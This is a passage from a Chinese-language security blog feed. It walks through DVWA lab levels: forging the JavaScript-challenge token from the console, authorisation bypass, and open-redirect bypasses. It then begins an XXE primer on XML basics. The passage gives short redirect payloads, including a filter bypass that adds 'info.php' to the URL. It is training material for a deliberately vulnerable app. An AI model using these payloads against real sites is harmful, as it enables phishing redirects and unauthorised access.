(h5 &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0xFF</span>, (h5 &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>, (h5 &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>, h5 &amp; <span class="hljs-number">0xFF</span>, (h6 &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0xFF</span>, (h6 &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>, (h6 &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>, h6 &amp; <span class="hljs-number">0xFF</span>];<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">is224</span>) &#123;<br>            arr.<span class="hljs-title function_">push</span>((h7 &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0xFF</span>, (h7 &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>, (h7 &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>, h7 &amp; <span class="hljs-number">0xFF</span>)<br>        &#125;<br>        <span class="hljs-keyword">return</span> arr<br>    &#125;;<br>    <span class="hljs-title class_">Sha256</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">array</span> = <span class="hljs-title class_">Sha256</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">digest</span>;<br>    <span class="hljs-title class_">Sha256</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">arrayBuffer</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">finalize</span>();<br>        <span class="hljs-keyword">var</span> buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">is224</span> ? <span class="hljs-number">28</span> : <span class="hljs-number">32</span>);<br>        <span class="hljs-keyword">var</span> dataView = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataView</span>(buffer);<br>        dataView.<span class="hljs-title function_">setUint32</span>(<span class="hljs-number">0</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">h0</span>);<br>        dataView.<span class="hljs-title function_">setUint32</span>(<span class="hljs-number">4</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">h1</span>);<br>        dataView.<span class="hljs-title function_">setUint32</span>(<span class="hljs-number">8</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">h2</span>);<br>        dataView.<span class="hljs-title function_">setUint32</span>(<span class="hljs-number">12</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">h3</span>);<br>        dataView.<span class="hljs-title function_">setUint32</span>(<span class="hljs-number">16</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">h4</span>);<br>        dataView.<span class="hljs-title function_">setUint32</span>(<span class="hljs-number">20</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">h5</span>);<br>        dataView.<span class="hljs-title function_">setUint32</span>(<span class="hljs-number">24</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">h6</span>);<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">is224</span>) &#123;<br>            dataView.<span class="hljs-title function_">setUint32</span>(<span class="hljs-number">28</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">h7</span>)<br>        &#125;<br>        <span class="hljs-keyword">return</span> buffer<br>    &#125;;<br><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">HmacSha256</span>(<span class="hljs-params">key, is224, sharedMemory</span>) &#123;<br>        <span class="hljs-keyword">var</span> i, type = <span class="hljs-keyword">typeof</span> key;<br>        <span class="hljs-keyword">if</span> (type === <span class="hljs-string">&#x27;string&#x27;</span>) &#123;<br>            <span class="hljs-keyword">var</span> bytes = [],<br>                length = key.<span class="hljs-property">length</span>,<br>                index = <span class="hljs-number">0</span>,<br>                code;<br>            <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; length; ++i) &#123;<br>                code = key.<span class="hljs-title function_">charCodeAt</span>(i);<br>                <span class="hljs-keyword">if</span> (code &lt; <span class="hljs-number">0x80</span>) &#123;<br>                    bytes[index++] = code<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (code &lt; <span class="hljs-number">0x800</span>) &#123;<br>                    bytes[index++] = (<span class="hljs-number">0xc0</span> | (code &gt;&gt; <span class="hljs-number">6</span>));<br>                    bytes[index++] = (<span class="hljs-number">0x80</span> | (code &amp; <span class="hljs-number">0x3f</span>))<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (code &lt; <span class="hljs-number">0xd800</span> || code &gt;= <span class="hljs-number">0xe000</span>) &#123;<br>                    bytes[index++] = (<span class="hljs-number">0xe0</span> | (code &gt;&gt; <span class="hljs-number">12</span>));<br>                    bytes[index++] = (<span class="hljs-number">0x80</span> | ((code &gt;&gt; <span class="hljs-number">6</span>) &amp; <span class="hljs-number">0x3f</span>));<br>                    bytes[index++] = (<span class="hljs-number">0x80</span> | (code &amp; <span class="hljs-number">0x3f</span>))<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    code = <span class="hljs-number">0x10000</span> + (((code &amp; <span class="hljs-number">0x3ff</span>) &lt;&lt; <span class="hljs-number">10</span>) | (key.<span class="hljs-title function_">charCodeAt</span>(++i) &amp; <span class="hljs-number">0x3ff</span>));<br>                    bytes[index++] = (<span class="hljs-number">0xf0</span> | (code &gt;&gt; <span class="hljs-number">18</span>));<br>                    bytes[index++] = (<span class="hljs-number">0x80</span> | ((code &gt;&gt; <span class="hljs-number">12</span>) &amp; <span class="hljs-number">0x3f</span>));<br>                    bytes[index++] = (<span class="hljs-number">0x80</span> | ((code &gt;&gt; <span class="hljs-number">6</span>) &amp; <span class="hljs-number">0x3f</span>));<br>                    bytes[index++] = (<span class="hljs-number">0x80</span> | (code &amp; <span class="hljs-number">0x3f</span>))<br>                &#125;<br>            &#125;<br>            key = bytes<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">if</span> (type === <span class="hljs-string">&#x27;object&#x27;</span>) &#123;<br>                <span class="hljs-keyword">if</span> (key === <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-variable constant_">ERROR</span>)<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable constant_">ARRAY_BUFFER</span> &amp;&amp; key.<span class="hljs-property">constructor</span> === <span class="hljs-title class_">ArrayBuffer</span>) &#123;<br>                    key = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>(key)<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(key)) &#123;<br>                    <span class="hljs-keyword">if</span> (!<span class="hljs-variable constant_">ARRAY_BUFFER</span> || !<span class="hljs-title class_">ArrayBuffer</span>.<span class="hljs-title function_">isView</span>(key)) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-variable constant_">ERROR</span>)<br>                    &#125;<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-variable constant_">ERROR</span>)<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (key.<span class="hljs-property">length</span> &gt; <span class="hljs-number">64</span>) &#123;<br>            key = (<span class="hljs-keyword">new</span> <span class="hljs-title class_">Sha256</span>(is224, <span class="hljs-literal">true</span>)).<span class="hljs-title function_">update</span>(key).<span class="hljs-title function_">array</span>()<br>        &#125;<br>        <span class="hljs-keyword">var</span> oKeyPad = [],<br>            iKeyPad = [];<br>        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">64</span>; ++i) &#123;<br>            <span class="hljs-keyword">var</span> b = key[i] || <span class="hljs-number">0</span>;<br>            oKeyPad[i] = <span class="hljs-number">0x5c</span> ^ b;<br>            iKeyPad[i] = <span class="hljs-number">0x36</span> ^ b<br>        &#125;<br>        <span class="hljs-title class_">Sha256</span>.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>, is224, sharedMemory);<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">update</span>(iKeyPad);<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">oKeyPad</span> = oKeyPad;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">inner</span> = <span class="hljs-literal">true</span>;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">sharedMemory</span> = sharedMemory<br>    &#125;<br>    <span class="hljs-title class_">HmacSha256</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Sha256</span>();<br>    <span class="hljs-title class_">HmacSha256</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">finalize</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-title class_">Sha256</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">finalize</span>.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">inner</span>) &#123;<br>            <span class="hljs-variable language_">this</span>.<span class="hljs-property">inner</span> = <span class="hljs-literal">false</span>;<br>            <span class="hljs-keyword">var</span> innerHash = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">array</span>();<br>            <span class="hljs-title class_">Sha256</span>.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">is224</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">sharedMemory</span>);<br>            <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">update</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">oKeyPad</span>);<br>            <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">update</span>(innerHash);<br>            <span class="hljs-title class_">Sha256</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">finalize</span>.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>)<br>        &#125;<br>    &#125;;<br>    <span class="hljs-keyword">var</span> <span class="hljs-built_in">exports</span> = <span class="hljs-title function_">createMethod</span>();<br>    <span class="hljs-built_in">exports</span>.<span class="hljs-property">sha256</span> = <span class="hljs-built_in">exports</span>;<br>    <span class="hljs-built_in">exports</span>.<span class="hljs-property">sha224</span> = <span class="hljs-title function_">createMethod</span>(<span class="hljs-literal">true</span>);<br>    <span class="hljs-built_in">exports</span>.<span class="hljs-property">sha256</span>.<span class="hljs-property">hmac</span> = <span class="hljs-title function_">createHmacMethod</span>();<br>    <span class="hljs-built_in">exports</span>.<span class="hljs-property">sha224</span>.<span class="hljs-property">hmac</span> = <span class="hljs-title function_">createHmacMethod</span>(<span class="hljs-literal">true</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable constant_">COMMON_JS</span>) &#123;<br>        <span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-built_in">exports</span><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        root.<span class="hljs-property">sha256</span> = <span class="hljs-built_in">exports</span>.<span class="hljs-property">sha256</span>;<br>        root.<span class="hljs-property">sha224</span> = <span class="hljs-built_in">exports</span>.<span class="hljs-property">sha224</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable constant_">AMD</span>) &#123;<br>            <span class="hljs-title function_">define</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-built_in">exports</span><br>            &#125;)<br>        &#125;<br>    &#125;<br>&#125;)();<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">do_something</span>(<span class="hljs-params">e</span>) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> t = <span class="hljs-string">&quot;&quot;</span>, n = e.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>; n &gt;= <span class="hljs-number">0</span>; n--) t += e[n];<br>    <span class="hljs-keyword">return</span> t<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">token_part_3</span>(<span class="hljs-params">t, y = <span class="hljs-string">&quot;ZZ&quot;</span></span>) &#123;<br>    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;token&quot;</span>).<span class="hljs-property">value</span> = <span class="hljs-title function_">sha256</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;token&quot;</span>).<span class="hljs-property">value</span> + y)<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">token_part_2</span>(<span class="hljs-params">e = <span class="hljs-string">&quot;YY&quot;</span></span>) &#123;<br>    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;token&quot;</span>).<span class="hljs-property">value</span> = <span class="hljs-title function_">sha256</span>(e + <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;token&quot;</span>).<span class="hljs-property">value</span>)<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">token_part_1</span>(<span class="hljs-params">a, b</span>) &#123;<br>    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;token&quot;</span>).<span class="hljs-property">value</span> = <span class="hljs-title function_">do_something</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;phrase&quot;</span>).<span class="hljs-property">value</span>)<br>&#125;<br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;phrase&quot;</span>).<span class="hljs-property">value</span> = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-title function_">token_part_2</span>(<span class="hljs-string">&quot;XX&quot;</span>)<br>&#125;, <span class="hljs-number">300</span>);<br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;send&quot;</span>).<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&quot;click&quot;</span>, token_part_3);<br><span class="hljs-title function_">token_part_1</span>(<span class="hljs-string">&quot;ABCD&quot;</span>, <span class="hljs-number">44</span>);<br></code></pre></td></tr></table></figure><p>我们可以直接看核心部分：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">do_something</span>(<span class="hljs-params">e</span>) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> t = <span class="hljs-string">&quot;&quot;</span>, n = e.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>; n &gt;= <span class="hljs-number">0</span>; n--) t += e[n];<br>    <span class="hljs-keyword">return</span> t<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">token_part_3</span>(<span class="hljs-params">t, y = <span class="hljs-string">&quot;ZZ&quot;</span></span>) &#123;<br>    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;token&quot;</span>).<span class="hljs-property">value</span> = <span class="hljs-title function_">sha256</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;token&quot;</span>).<span class="hljs-property">value</span> + y)<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">token_part_2</span>(<span class="hljs-params">e = <span class="hljs-string">&quot;YY&quot;</span></span>) &#123;<br>    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;token&quot;</span>).<span class="hljs-property">value</span> = <span class="hljs-title function_">sha256</span>(e + <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;token&quot;</span>).<span class="hljs-property">value</span>)<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">token_part_1</span>(<span class="hljs-params">a, b</span>) &#123;<br>    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;token&quot;</span>).<span class="hljs-property">value</span> = <span class="hljs-title function_">do_something</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;phrase&quot;</span>).<span class="hljs-property">value</span>)<br>&#125;<br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;phrase&quot;</span>).<span class="hljs-property">value</span> = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-title function_">token_part_2</span>(<span class="hljs-string">&quot;XX&quot;</span>)<br>&#125;, <span class="hljs-number">300</span>);<br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;send&quot;</span>).<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&quot;click&quot;</span>, token_part_3);<br><span class="hljs-title function_">token_part_1</span>(<span class="hljs-string">&quot;ABCD&quot;</span>, <span class="hljs-number">44</span>);<br></code></pre></td></tr></table></figure><p>function token_part_3(t, y = "ZZ")、function token_part_2(e = "YY")、functiontoken_part_1(a, b) 都是对token进行加密处理</p><p>执行步骤为：</p><p>1、将id="phrase"输入框的值置空 document.getElementById("phrase").value = "";</p><p>2、调用token_part_1() 方法 token_part_1("ABCD", 44);</p><p>3、执行 token_part_2() 方法</p><p>setTimeout(function() {</p><p>token_part_2("XX")</p><p>}, 300);</p><p>4、执行token_part_3() 方法 document.getElementById("send").addEventListener("click", token_part_3);</p><p>因为token_part_2()方法延迟了3秒执行所以在延迟执行的过程中token_part_1()方法会优先执行<br>ok思路理清后开始操作：</p><p>将输入框的值改为success</p><p>在前端控制台依次执行   token_part_1("ABCD", 44);    token_part_2("XX");</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-23%20100855.png" alt="屏幕截图 2024-02-23 100855"></p><p>然后提交即可</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-23%20100905.png" alt="屏幕截图 2024-02-23 100905"></p><h3 id="4-Impossible-13"><a href="#4-Impossible-13" class="headerlink" title="4.Impossible"></a>4.Impossible</h3><p>页面提示如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-23%20101202.png" alt="屏幕截图 2024-02-23 101202"></p><p>大致意思是：你永远不能相信来自用户的任何东西，或者阻止他们破坏它，但是你又不能阻止用户的输入因为这样可能会干扰网站的正常使用，所以不存在Impossible级别</p><h2 id="十五、Authorisation-Bypass"><a href="#十五、Authorisation-Bypass" class="headerlink" title="十五、Authorisation Bypass"></a>十五、Authorisation Bypass</h2><p>授权绕过（Authorization Bypass）是指在计算机系统中绕过正常的授权机制，未经授权就访问系统资源的行为。这通常涉及到利用系统漏洞、配置错误或安全策略的弱点，以非法方式获取对敏感数据、应用程序或系统的访问权限</p><h3 id="1-Low-14"><a href="#1-Low-14" class="headerlink" title="1.Low"></a>1.Low</h3><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-23%20113341.png" alt="屏幕截图 2024-02-23 113341"></p><p>进入页面显示</p><p>此页面只能由管理员用户访问。您面临的挑战是使用其他用户之一访问这些功能，例如gordonb/abc 123</p><p>然后我们重新打开一个没登录过的dvwa然后使用他给我们的账密gordonb/abc 123进行登录</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-23%20113257.png" alt="屏幕截图 2024-02-23 113257"></p><p>我们发现用户是没有授权绕过这一选项的</p><h2 id="十六、Vulnerability-Open-HTTP-Redirect"><a href="#十六、Vulnerability-Open-HTTP-Redirect" class="headerlink" title="十六、Vulnerability: Open HTTP Redirect"></a>十六、Vulnerability: Open HTTP Redirect</h2><h3 id="1-Low-15"><a href="#1-Low-15" class="headerlink" title="1.Low"></a>1.Low</h3><p>先看源码如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240223105245195.png" alt="image-20240223105245195"></p><p>先通过 array_key_exists 函数判断 $_GET 数组中是否存在 redirect 键值，如果存在且不为空，则调用 header 函数，否则返回 500 状态码然后调用 header 函数，将 Location 字段设置为  $ GET[‘redirect’] 的值，完成重定向操作。exit 函数用于终止脚本的执行，确保 header 函数的执行效果<br>由于源码没有对重定向参数传递进行任何过滤</p><p>因此构造Payload：<br><code>?redirect=跳转网页URL</code></p><h3 id="2-Medium-14"><a href="#2-Medium-14" class="headerlink" title="2.Medium"></a>2.Medium</h3><p>先分析源码</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240223110340580.png" alt="image-20240223110340580"></p><p>此关代码与上一关的主要不同的点在于使用了正则匹配</p><p>正则表达式 preg_match 来检查 $_GET[‘redirect’] 的值是否以 “http://” 或 “https://” 开头且不区分大小写<br>如果匹配到了这两个前缀会返回 HTTP 响应码 500并输出提示信息 " Absolute URLs not allowed "然后程序终止执行<br>如果没有匹配到绝对 URL 的前缀，即以相对路径形式存在，将执行接下来的代码<br>使用 header 函数将浏览器重定向到 $ GET[‘redirect’] 指定的地址<br>执行 exit 终止后续代码的执行</p><p>因此我们可以使用 JavaScript 进行重定向或者创建一个中间代理页面</p><p>以下是一个示例 JavaScript 代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> redirectURL = <span class="hljs-string">&quot;http://www.example.com&quot;</span>; <span class="hljs-comment">// 设置要重定向的网页地址</span></span><br><span class="language-javascript">    <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span> = redirectURL; <span class="hljs-comment">// 执行重定向</span></span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>将上述代码插入到编辑器的代码中，加载该网页时，JavaScript 代码会将用户重定向到指定的网页。</p><h3 id="3-High-14"><a href="#3-High-14" class="headerlink" title="3.High"></a>3.High</h3><p>代码分析：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240223112120772.png" alt="image-20240223112120772"></p><p>此关与上一关的不同点在于</p><p>检查 $_GET['redirect'] 参数中是否包含字符串 “info.php”。这里使用了 strpos() 函数来检查字符串中是否包含指定的内容</p><p>如果 $_GET['redirect'] 参数包含字符串 “info.php”，则使用 header() 函数进行重定向，将用户重定向到 $GET['redirect'] 中指定的页面</p><p>如果 $_GET['redirect'] 参数不包含字符串 “info.php”，则返回 HTTP 响应码 500（服务器内部错误）并输出一段提示信息：“You can only redirect to the info page.”</p><p>如果没有传递 “redirect” 参数，或者其值为空，则同样返回 HTTP 响应码 500，并输出另一段提示信息：“Missing redirect target.”</p><p>则在构造参数时是指包含字符串info.php即可<br>payload：<code>?redirect=https//www.baidu.com/?redirect=info.php</code></p><h3 id="4-Impossible-14"><a href="#4-Impossible-14" class="headerlink" title="4.Impossible"></a>4.Impossible</h3><p>源码：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240223112410077.png" alt="image-20240223112410077"></p><p>其实这关就是设置了白名单他只允许传入参数的值为他指定的其余的均无效</p><p>OVER！</p>]]></content>
    
    
    
    <tags>
      
      <tag>靶场</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XXE</title>
    <link href="/2024/04/25/XXE/"/>
    <url>/2024/04/25/XXE/</url>
    
    <content type="html"><![CDATA[<h1 id="XXE漏洞知识及ctfshow例题"><a href="#XXE漏洞知识及ctfshow例题" class="headerlink" title="XXE漏洞知识及ctfshow例题"></a>XXE漏洞知识及ctfshow例题</h1><h2 id="XXE漏洞相关知识"><a href="#XXE漏洞相关知识" class="headerlink" title="XXE漏洞相关知识"></a>XXE漏洞相关知识</h2><p>XXE全称为XML Enternal Entity Injection 中文叫xml外部实体注入</p><h3 id="什么是xml"><a href="#什么是xml" class="headerlink" title="什么是xml"></a>什么是xml</h3><p>简单了解XML：</p><p>（xml和html的区别可以简易的理解成：xml是用来储存数据和传输数据的而html是用来将数据展现出来）</p><p>XML 指可扩展标记语言（EXtensible Markup Language）<br>XML 是一种标记语言，很类似 HTML<br>XML <strong>被设计为传输和存储数据</strong>，其焦点是数据的内容 XML 被设计用来结构化、存储以及传输信息<br>XML 允许创作者定义自己的标签和自己的文档结构<br>语法：</p><p>XML元素都必须有关闭标签<br>XML 标签对大小写敏感<br>XML 必须正确地嵌套<br>XML 文档必须有根元素<br>XML 的属性值须加引号<br>结构：</p><p>XML 文档声明，在文档的第一行<br>XML 文档类型定义，即DTD，XXE 漏洞所在的地方<br>XML 文档元素<br>例子：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><span class="hljs-comment">&lt;!--说明了xml文档的版本还有编码类型 经常出现在xml文档的开头--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">userConfig</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>john_doe<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>secretpassword<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">language</span>&gt;</span>en_US<span class="hljs-tag">&lt;/<span class="hljs-name">language</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">theme</span>&gt;</span>dark<span class="hljs-tag">&lt;/<span class="hljs-name">theme</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>jane_smith<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>anotherpassword<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">language</span>&gt;</span>fr_FR<span class="hljs-tag">&lt;/<span class="hljs-name">language</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">theme</span>&gt;</span>light<span class="hljs-tag">&lt;/<span class="hljs-name">theme</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">userConfig</span>&gt;</span><br></code></pre></td></tr></table></figure><p>在xml文档中注释是使用<!--注释-->进行注释</p><p>以上是一个简单的xml文档其中的<userConfig>元素中嵌套着<user>；<user>中嵌套着<username> <password> <language> <theme>这些元素</p><p>而这些元素其中的jane_smith则为这个xml文档中储存的数据</p><p>（</p><p>为什么都有数据库了还要用xml来储存数据 ：我个人认为是因为数据库对于我们来说可读性不高因为可能都是经过加密或者编码后的而xml相对来说可读性就很高便于人识别，经常用来当作配置文件</p><p>以下是一些使用 XML 的情况：</p><ol><li><p><strong>数据交换格式</strong>：XML 是一种通用的数据交换格式，在不同系统之间传递数据时非常有用。许多 